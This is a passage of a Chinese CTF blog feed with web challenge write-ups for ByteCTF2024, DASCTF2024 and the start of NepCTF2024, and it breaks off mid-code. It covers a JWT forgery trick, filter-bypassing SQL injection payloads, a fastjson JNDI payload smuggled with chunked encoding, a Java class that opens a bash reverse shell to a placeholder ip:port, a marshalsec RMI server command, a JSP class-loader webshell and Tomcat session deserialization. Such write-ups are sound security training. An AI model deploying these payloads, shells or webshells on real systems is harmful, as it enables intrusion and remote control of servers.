class="hljs-tag">&lt;<span class="hljs-name">samlsig:SignatureValue</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">samlsig:SignatureValue</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">samlsig:KeyInfo</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">samlsig:X509Data</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">samlsig:X509Certificate</span>&gt;</span>CHAIN1_CERT_B64<span class="hljs-tag">&lt;/<span class="hljs-name">samlsig:X509Certificate</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">samlsig:X509Certificate</span>&gt;</span>MY_CERT_B64<span class="hljs-tag">&lt;/<span class="hljs-name">samlsig:X509Certificate</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">samlsig:X509Data</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">samlsig:KeyInfo</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">samlsig:Signature</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">samlp:Status</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">samlp:StatusCode</span> <span class="hljs-attr">Value</span>=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:status:Success&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">samlp:Status</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">saml:Assertion</span> <span class="hljs-attr">xmlns:xs</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns:saml</span>=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span> <span class="hljs-attr">ID</span>=<span class="hljs-string">&quot;_29cf1612-da76-45f5-7552-3764fa8b41f2&quot;</span> <span class="hljs-attr">Version</span>=<span class="hljs-string">&quot;2.0&quot;</span> <span class="hljs-attr">IssueInstant</span>=<span class="hljs-string">&quot;2024-09-21T06:23:13.437234459Z&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">saml:Issuer</span>&gt;</span>http://localhost:8000/saml_consume<span class="hljs-tag">&lt;/<span class="hljs-name">saml:Issuer</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">saml:Subject</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">saml:NameID</span> <span class="hljs-attr">Format</span>=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:nameid-format:transient&quot;</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">saml:NameID</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">saml:SubjectConfirmation</span> <span class="hljs-attr">Method</span>=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&quot;</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">saml:SubjectConfirmationData</span> <span class="hljs-attr">InResponseTo</span>=<span class="hljs-string">&quot;abc&quot;</span> <span class="hljs-attr">NotOnOrAfter</span>=<span class="hljs-string">&quot;2034-09-21T06:28:13.437234739Z&quot;</span> <span class="hljs-attr">Recipient</span>=<span class="hljs-string">&quot;http://localhost:8000/saml_consume&quot;</span>/&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">saml:SubjectConfirmation</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">saml:Subject</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">saml:Conditions</span> <span class="hljs-attr">NotBefore</span>=<span class="hljs-string">&quot;2024-09-21T06:18:13.43723516Z&quot;</span> <span class="hljs-attr">NotOnOrAfter</span>=<span class="hljs-string">&quot;2034-09-21T06:28:13.43723533Z&quot;</span>/&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">saml:AttributeStatement</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">saml:Attribute</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;uid&quot;</span> <span class="hljs-attr">NameFormat</span>=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">saml:AttributeValue</span> <span class="hljs-attr">xsi:type</span>=<span class="hljs-string">&quot;xs:string&quot;</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">saml:AttributeValue</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">saml:Attribute</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">saml:Attribute</span> <span class="hljs-attr">Name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">NameFormat</span>=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">saml:AttributeValue</span> <span class="hljs-attr">xsi:type</span>=<span class="hljs-string">&quot;xs:string&quot;</span>&gt;</span>someone@domain<span class="hljs-tag">&lt;/<span class="hljs-name">saml:AttributeValue</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">saml:Attribute</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">saml:AttributeStatement</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">saml:Assertion</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">samlp:Response</span>&gt;</span></code></pre></div><p>感觉挺多是废话，算了不看了</p><p>然后就会返回值</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;code&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;LBGH78tO5r&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;token&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3Mjc1MDkzMjIsImlzcyI6ImJ5dGVjdGYiLCJ1c2VybmFtZSI6Imd1ZXN0In0.28NdXFugKmrmGFNKR16vA_HiSQO0kJOqOwOdRtIUqWI&quot;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><h3 id="jwt-v4逻辑问题"><a href="#jwt-v4逻辑问题" class="headerlink" title="jwt&#x2F;v4逻辑问题"></a>jwt&#x2F;v4逻辑问题</h3><p>这个是v4版本存在的逻辑问题</p><p><img src="/../images/ByteCTF2024-web/image-20240925051359010.png" alt="image-20240925051359010"></p><p>或许算个提示吧，让token过期</p><p><img src="/../images/ByteCTF2024-web/image-20240925051918466.png" alt="image-20240925051918466"></p><p>并且在Parse阶段发现一个点（翻v4的源码）</p><p><img src="/../images/ByteCTF2024-web/image-20240925051510045.png" alt="image-20240925051510045"></p><p><img src="/../images/ByteCTF2024-web/image-20240925052258987.png" alt="image-20240925052258987"></p><p>先使用token.Claims.Valid()来判断claims的时间是否有效，若有效，则继续验证token的签名</p><p>我们这里就让Claims提前抛出了TimeExpired错误，就可以不需要签名</p><p>伪造的exp设置小一点，不然会重新签名</p><p><img src="/../images/ByteCTF2024-web/image-20240925053213061.png" alt="image-20240925053213061"></p><div class="code-wrapper"><pre><code class="hljs gcode">eyJhbGciOiJIUzI<span class="hljs-number">1</span><span class="hljs-symbol">NiIsInR5</span>cCI<span class="hljs-number">6</span>IkpX<span class="hljs-attr">VCJ9</span>.eyJleHAiOjE<span class="hljs-number">3</span>MjY<span class="hljs-number">5</span>MDEwMzMsImlzcyI<span class="hljs-number">6</span>ImJ<span class="hljs-number">5</span>dGVjdGYiLCJ<span class="hljs-number">1</span>c<span class="hljs-number">2</span>VybmFtZSI<span class="hljs-number">6</span>ImFkbWluI<span class="hljs-symbol">n0</span>.AAAA&#123;  <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">1726901033</span>,  <span class="hljs-string">&quot;iss&quot;</span>: <span class="hljs-string">&quot;bytectf&quot;</span>,  <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>&#125;</code></pre></div><p><img src="/../images/ByteCTF2024-web/image-20240925054345918.png" alt="image-20240925054345918"></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://blog.wm-team.cn/index.php/archives/81/">https://blog.wm-team.cn/index.php/archives/81/</a></p><p><a href="https://mp.weixin.qq.com/s/O_OV1eA9yYQlhwaSP-fuIA">https://mp.weixin.qq.com/s/O_OV1eA9yYQlhwaSP-fuIA</a></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>说实话这难度不好说，对于Byte来说感觉出的有点简单，但不妨碍我不会</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF2024八月开学季--web</title>
    <link href="/2024/09/01/DASCTF2024%E5%85%AB%E6%9C%88%E5%BC%80%E5%AD%A6%E5%AD%A3-web/"/>
    <url>/2024/09/01/DASCTF2024%E5%85%AB%E6%9C%88%E5%BC%80%E5%AD%A6%E5%AD%A3-web/</url>
    
    <content type="html"><![CDATA[<h1 id="DASCTF2024八月开学季-–web"><a href="#DASCTF2024八月开学季-–web" class="headerlink" title="DASCTF2024八月开学季 –web"></a>DASCTF2024八月开学季 –web</h1><h2 id="Truman"><a href="#Truman" class="headerlink" title="Truman"></a>Truman</h2><p><img src="/../images/DASCTF2024%E5%85%AB%E6%9C%88%E5%BC%80%E5%AD%A6%E5%AD%A3-web/image-20240901122922285.png" alt="image-20240901122922285"></p><p>随便输入很容易发现是ssti漏洞</p><p>直接一把梭哈</p><p><img src="/../images/DASCTF2024%E5%85%AB%E6%9C%88%E5%BC%80%E5%AD%A6%E5%AD%A3-web/image-20240901123126954.png" alt="image-20240901123126954"></p><h2 id="Monument"><a href="#Monument" class="headerlink" title="Monument"></a>Monument</h2><p>由于没有环境，并且懒得搭建，所以就抄一下官方WP，进行一下描述</p><h3 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h3><p>访问题目是个查询框 要求输入id，很明显是有回显sql注入</p><p>1-9能够查询出东西，其余的页面会回显notfound 或error</p><p>测试发现<code>#</code>和空格被过滤了</p><div class="code-wrapper"><pre><code class="hljs rust">-<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;union</span><span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span>select<span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>--<span class="hljs-comment">//回显2 4 </span>-<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;union</span><span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span>select<span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-title function_ invoke__">database</span>()--<span class="hljs-comment">//表名user </span>-<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;union</span><span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span>select<span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-title function_ invoke__">group_concat</span>(table_name)<span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span>from<span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span>information_schema.tables<span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span>table_schema<span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span>=<span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span><span class="hljs-symbol">&#x27;user</span>&#x27;--<span class="hljs-comment">//us???er,userinfo</span>-<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;union</span><span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span>select<span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-title function_ invoke__">group_concat</span>(column_name)<span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span>from<span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span>information_schema.columns<span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span>table_name=<span class="hljs-symbol">&#x27;us</span>???er&#x27;--<span class="hljs-comment">//id,username,content,info</span>-<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;union</span><span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span>select<span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-title function_ invoke__">group_concat</span>(id,username,content,info)<span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span>from<span class="hljs-comment">/*<span class="hljs-comment">/**/</span>*/</span>`us???er`--这里us???er是一个表名，它包含特殊字符“?”用反引号包裹以确保解析正确处理标识符，而不将其误认为是其他符号或关键字的一部分<span class="hljs-comment">//1amdyesno,2intelnoyes,3Overclocked to 5GHz????50% of humans thank me,4Overclocked to 10GHz????100% of humans thank me,5ok????try to /ch4ng3us3r1nf0 page,6why????Lower versions</span></code></pre></div><p>….服了，真的一点不会sql注入，但凡过滤一点东西我就懒得去看了。。。。。</p><p>就得到了<code>/ch4ng3us3r1nf0</code>路由</p><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><p>&#x2F;ch4ng3us3r1nf0修改用户信息， 页面返回json对象，尝试post一个新的json对象去解析</p><p>很明显是个fastjson</p><p>版本不是很高，正常打</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span>        <span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://ip:port/Evil&quot;</span><span class="hljs-punctuation">,</span>        <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></code></pre></div><p>发送时发现限制长度content-type</p><p>无论怎么短链接或者缩短payload长度无法降低到限制长度以下</p><p>请求走私chunked编码绕过长度限制</p><p>这里利用burp的插件转换为chunked编码即可</p><p><img src="/../images/DASCTF2024%E5%85%AB%E6%9C%88%E5%BC%80%E5%AD%A6%E5%AD%A3-web/image-20240901143753428.png" alt="image-20240901143753428"></p><p><img src="/../images/DASCTF2024%E5%85%AB%E6%9C%88%E5%BC%80%E5%AD%A6%E5%AD%A3-web/image-20240901143833624.png" alt="image-20240901143833624"></p><p>后面就是正常打fastjson的流程</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.Runtime;<span class="hljs-keyword">import</span> java.lang.Process;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span>&#123;    <span class="hljs-keyword">static</span> &#123;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();            String[] commands = &#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span>&#125;;            <span class="hljs-type">Process</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> rt.exec(commands);            pc.waitFor();        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;        &#125;    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.RMIRefServer http://ip:port/#Evil <span class="hljs-number">1099</span></code></pre></div><p>就wp的复杂程度来说，很明显这道题是比<code>ErloGrave</code>要简单的，但是却是0解题，就挺让人意外的</p><p>感觉关键点就是要把payload使用chunked编码来进行传输，这一点应该就是卡住的地方</p><h2 id="ErloGrave"><a href="#ErloGrave" class="headerlink" title="ErloGrave"></a>ErloGrave</h2><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>这道题其实是存在非预期的</p><p>因为给出的源代码只有两个</p><p><img src="/../images/DASCTF2024%E5%85%AB%E6%9C%88%E5%BC%80%E5%AD%A6%E5%AD%A3-web/image-20240901145823941.png" alt="image-20240901145823941"></p><p>但是Erlo.war包中却多了个<code>SerTestServlet.class</code></p><p><img src="/../images/DASCTF2024%E5%85%AB%E6%9C%88%E5%BC%80%E5%AD%A6%E5%AD%A3-web/image-20240901145958696.png" alt="image-20240901145958696"></p><p>存在deserialize路由，能够反序列化上传的<code>name</code>的名为<code>serializedObject</code>的值</p><p>并且lib中存在cc3.1</p><p><img src="/../images/DASCTF2024%E5%85%AB%E6%9C%88%E5%BC%80%E5%AD%A6%E5%AD%A3-web/image-20240901150133272.png" alt="image-20240901150133272"></p><p>直接打cc6即可</p><p>题目应该是不出网的，于是尝试写马</p><p>这里我就偷懒，使用官方WP中的马</p><div class="code-wrapper"><pre><code class="hljs reasonml">&lt;%!    <span class="hljs-keyword">class</span> U extends ClassLoader &#123;        <span class="hljs-constructor">U(ClassLoader <span class="hljs-params">c</span>)</span> &#123;            super(c);        &#125;        public Class g(byte<span class="hljs-literal">[]</span> b) &#123;            return super.define<span class="hljs-constructor">Class(<span class="hljs-params">b</span>, 0, <span class="hljs-params">b</span>.<span class="hljs-params">length</span>)</span>;        &#125;    &#125;    public byte<span class="hljs-literal">[]</span> base64<span class="hljs-constructor">Decode(String <span class="hljs-params">str</span>)</span> throws Exception &#123;        <span class="hljs-keyword">try</span> &#123;            Class clazz = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>)</span>;            return (byte<span class="hljs-literal">[]</span>) clazz.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, String.<span class="hljs-params">class</span>)</span>.invoke(clazz.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>, str);        &#125; catch (Exception e) &#123;            Class clazz = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.Base64&quot;</span>)</span>;            Object decoder = clazz.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;getDecoder&quot;</span>)</span>.invoke(null);            return (byte<span class="hljs-literal">[]</span>) decoder.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;decode&quot;</span>, String.<span class="hljs-params">class</span>)</span>.invoke(decoder, str);        &#125;    &#125;%&gt;&lt;%    String cls = request.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;Qst&quot;</span>)</span>;    <span class="hljs-keyword">if</span> (cls != null) &#123;        <span class="hljs-keyword">new</span> <span class="hljs-constructor">U(<span class="hljs-params">this</span>.<span class="hljs-params">getClass</span>()</span>.get<span class="hljs-constructor">ClassLoader()</span>).g(base64<span class="hljs-constructor">Decode(<span class="hljs-params">cls</span>)</span>).<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>.equals(pageContext);    &#125;%&gt;</code></pre></div><div class="code-wrapper"><pre><code class="hljs awk">echo <span class="hljs-string">&#x27;......&#x27;</span>| base64 -d &gt; <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/tomcat/</span>webapps<span class="hljs-regexp">/ROOT/</span>shell.jsp</code></pre></div><p><img src="/../images/DASCTF2024%E5%85%AB%E6%9C%88%E5%BC%80%E5%AD%A6%E5%AD%A3-web/image-20240901150848364.png" alt="image-20240901150848364"></p><div class="code-wrapper"><pre><code class="hljs txt">&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;file&quot; name=&quot;serializedObject&quot;&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;&lt;/form&gt;</code></pre></div><p><img src="/../images/DASCTF2024%E5%85%AB%E6%9C%88%E5%BC%80%E5%AD%A6%E5%AD%A3-web/image-20240901151436464.png" alt="image-20240901151436464"></p><p><img src="/../images/DASCTF2024%E5%85%AB%E6%9C%88%E5%BC%80%E5%AD%A6%E5%AD%A3-web/image-20240901151447772.png" alt="image-20240901151447772"></p><p><img src="/../images/DASCTF2024%E5%85%AB%E6%9C%88%E5%BC%80%E5%AD%A6%E5%AD%A3-web/image-20240901151622611.png" alt="image-20240901151622611"></p><p><img src="/../images/DASCTF2024%E5%85%AB%E6%9C%88%E5%BC%80%E5%AD%A6%E5%AD%A3-web/image-20240901151659489.png" alt="image-20240901151659489"></p><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>这个就是一个没接触过的知识点 ——–   <strong>tomcat-session</strong>反序列化</p><h4 id="tomcat-session反序列化"><a href="#tomcat-session反序列化" class="headerlink" title="tomcat-session反序列化"></a>tomcat-session反序列化</h4><p>前提是<code>conf/context.xml</code>中开启FileStore(session持久化功能)</p><div class="code-wrapper"><pre><code class="hljs abnf">&lt;Store className<span class="hljs-operator">=</span><span class="hljs-string">&quot;org.apache.catalina.session.FileStore&quot;</span> directory<span class="hljs-operator">=</span><span class="hljs-string">&quot;/tmp/session&quot;</span> /&gt;</code></pre></div><p>会把JSESSIONID的名称作为SESSION文件名的一部分进行读取之后反序列化</p><p>比如<code>JSESSIONID=../../../../tmp/feng</code>，那么就会读取<code>/xxxxxx/../../../../tmp/feng.session</code>的内容并反序列化</p><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>题目的 Session 使用的是 <a href="https://github.com/ran-jit/tomcat-cluster-redis-session-manager">tomcat-cluster-redis-session-manager</a> 这个依赖</p><p>可以追踪发现处理session的逻辑</p><p><img src="/../images/DASCTF2024%E5%85%AB%E6%9C%88%E5%BC%80%E5%AD%A6%E5%AD%A3-web/image-20240901180951164.png" alt="image-20240901180951164"></p><p>会把从Redis中读取的session进行反序列化</p><p>结合 tomcat session 的机制，得出可以将 payload 传入 Redis ，然后改到 JSESSION </p><p><img src="/../images/DASCTF2024%E5%85%AB%E6%9C%88%E5%BC%80%E5%AD%A6%E5%AD%A3-web/image-20240901190743686.png" alt="image-20240901190743686"></p><p>password会被base64解密，然后作为值传入redis中</p><p>所以构造恶意base64数据进行一次登陆后</p><p>第二次登录时修改为<code>JSESSIONID=fail::你第一次登录的username</code>即可</p><p>可以使用非预期中生成的erlo.ser，把他base64加密一下</p><div class="code-wrapper"><pre><code class="hljs swift"><span class="hljs-keyword">import</span> base64path <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:<span class="hljs-subst">\\</span>CTF<span class="hljs-subst">\\</span>tools<span class="hljs-subst">\\</span>ysoserial<span class="hljs-subst">\\</span>erlo.ser&quot;</span>with <span class="hljs-keyword">open</span> (path, &#x27;rb&#x27;) <span class="hljs-keyword">as</span> f:    file_content <span class="hljs-operator">=</span> f.read()<span class="hljs-built_in">print</span>(base64.b64encode(file_content).decode())</code></pre></div><p><img src="/../images/DASCTF2024%E5%85%AB%E6%9C%88%E5%BC%80%E5%AD%A6%E5%AD%A3-web/image-20240901190523506.png" alt="image-20240901190523506"></p><p><img src="/../images/DASCTF2024%E5%85%AB%E6%9C%88%E5%BC%80%E5%AD%A6%E5%AD%A3-web/image-20240901190604946.png" alt="image-20240901190604946"></p><p><img src="/../images/DASCTF2024%E5%85%AB%E6%9C%88%E5%BC%80%E5%AD%A6%E5%AD%A3-web/image-20240901190257021-17251887322001.png" alt="image-20240901190257021"></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/iavv2gfao7ea2buw?singleDoc#xwxbK">DASCTF2024 八月挑战赛 官方WP (yuque.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NepCTF2024-web</title>
    <link href="/2024/08/28/NepCTF2024-web/"/>
    <url>/2024/08/28/NepCTF2024-web/</url>
    
    <content type="html"><![CDATA[<h1 id="NepCTF2024-web-复现"><a href="#NepCTF2024-web-复现" class="headerlink" title="NepCTF2024-web 复现"></a>NepCTF2024-web 复现</h1><h2 id="NepDouble"><a href="#NepDouble" class="headerlink" title="NepDouble"></a>NepDouble</h2><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request,render_template,render_template_string<span class="hljs-keyword">from</span> zipfile <span class="hljs-keyword">import</span> ZipFile<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> datetime<span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Environment, FileSystemLoaderapp = Flask(__name__,template_folder=<span class="hljs-string">&#x27;static&#x27;</span>)app.config[<span class="hljs-string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="hljs-number">1</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>UPLOAD_FOLDER = <span class="hljs-string">&#x27;/app/uploads&#x27;</span>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(UPLOAD_FOLDER):    os.makedirs(UPLOAD_FOLDER)template_env = Environment(loader=FileSystemLoader(<span class="hljs-string">&#x27;static&#x27;</span>), autoescape=<span class="hljs-literal">True</span>)<span class="hljs-keyword">def</span> <span class="hljs-title function_">render_template</span>(<span class="hljs-params">template_name, **context</span>):    template = template_env.get_template(template_name)    <span class="hljs-keyword">return</span> template.render(**context)<span class="hljs-keyword">def</span> <span class="hljs-title function_">render_template_string</span>(<span class="hljs-params">template_string, **context</span>):    template = template_env.from_string(template_string)    <span class="hljs-keyword">return</span> template.render(**context)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():    <span class="hljs-keyword">if</span> request.method != <span class="hljs-string">&quot;POST&quot;</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Please use POST method to upload files.&#x27;</span>    <span class="hljs-keyword">try</span>:        clear_uploads_folder()        files = request.files.get(<span class="hljs-string">&#x27;tp_file&#x27;</span>, <span class="hljs-literal">None</span>)        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> files:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No file uploaded.&#x27;</span>        file_size = <span class="hljs-built_in">len</span>(files.read())        files.seek(<span class="hljs-number">0</span>)        file_extension = files.filename.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[-<span class="hljs-number">1</span>].lower()        <span class="hljs-keyword">if</span> file_extension != <span class="hljs-string">&#x27;zip&#x27;</span>:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file type. Please upload a .zip file.&#x27;</span>        timestamp = datetime.datetime.now().strftime(<span class="hljs-string">&#x27;%Y%m%d%H%M%S&#x27;</span>)        md5_dir_name = hashlib.md5(timestamp.encode()).hexdigest()        unzip_folder = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], md5_dir_name)        os.makedirs(unzip_folder, exist_ok=<span class="hljs-literal">True</span>)        <span class="hljs-keyword">with</span> ZipFile(files) <span class="hljs-keyword">as</span> zip_file:            zip_file.extractall(path=unzip_folder)        files_list = []        <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(unzip_folder):            <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:                <span class="hljs-built_in">print</span>(file)                file_path = os.path.join(root, file)                relative_path = os.path.relpath(file_path, app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>])                link = <span class="hljs-string">f&#x27;&lt;a href=&quot;/cat?file=<span class="hljs-subst">&#123;relative_path&#125;</span>&quot;&gt;<span class="hljs-subst">&#123;file&#125;</span>&lt;/a&gt;&#x27;</span>                files_list.append(link)        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>.join(files_list))    <span class="hljs-keyword">except</span> ValueError:        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid filename.&#x27;</span>        <span class="hljs-keyword">except</span> Exception <span 